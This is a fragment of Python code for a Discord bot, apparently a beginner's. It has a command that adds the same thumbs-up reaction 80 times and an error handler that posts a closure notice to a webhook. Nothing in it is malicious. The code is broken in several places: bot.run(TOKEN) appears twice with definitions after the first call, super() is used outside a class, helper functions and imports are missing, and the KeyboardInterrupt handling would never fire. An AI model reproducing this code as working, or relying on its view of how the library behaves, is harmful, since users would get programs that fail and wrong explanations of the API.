@bot.command(name='react')
async def react_command(ctx):
    # Your message content
    message_content = "React to this message!"

    # Send the message
    sent_message = await ctx.send(message_content)

    # Add 80 reactions to the message
    for _ in range(80):
        await sent_message.add_reaction("👍")  # You can replace "👍" with any emoji        

# Run the bot with the token
bot.run(TOKEN)



# Catch KeyboardInterrupt (Ctrl+C) to announce when someone closes the script
@bot.event
async def on_error(event, *args, **kwargs):
    if isinstance(args[0], KeyboardInterrupt):
        await announce_script_closure()
    else:
        super().on_error(event, *args, **kwargs)

async def announce_script_closure():
    try:
        await set_window_topmost()
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
            await webhook.send("The script has been closed.")
    except Exception as e:
        print(f"Error notifying webhook about script closure: {e}")

# Run the bot with the token
bot.run(TOKEN)